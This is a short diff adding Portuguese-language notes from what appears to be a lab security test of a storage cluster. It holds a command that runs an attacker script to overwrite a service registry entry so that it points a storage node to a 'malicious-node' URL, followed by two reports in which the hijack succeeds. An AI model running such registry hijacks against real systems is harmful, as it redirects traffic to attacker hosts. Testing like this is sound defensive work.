@@ -1,0 +1,33 @@
+Hijack:
+demorei a fazer o collect da 1a vez, então fiz 2 vezes:
+python3 /root/attacker.py hijack --storage-id storage-pt-aveiro-dc1-r02-n01 --malicious-url http://malicious-node.incus:6666
+
+
+=======================================================
+ RELATÓRIO: REGISTRY-HIJACK
+=======================================================
+Duração:             0.0114 s
+Pedidos:             2
+Respostas HTTP 2xx:  2
+Pedidos/segundo:     175.14
+Latência média:      5.26 ms
+Códigos HTTP:        {'200': 2}
+Erros:               {}
+Fases:               {'registry_overwrite': 1, 'registry_discovery_verification': 1}
+=======================================================
+
+
+
+=======================================================
+ RELATÓRIO: REGISTRY-HIJACK
+=======================================================
+Duração:             0.0106 s
+Pedidos:             2
+Respostas HTTP 2xx:  2
+Pedidos/segundo:     189.29
+Latência média:      5.07 ms
+Códigos HTTP:        {'200': 2}
+Erros:               {}
+Fases:               {'registry_overwrite': 1, 'registry_discovery_verification': 1}
+=======================================================
+
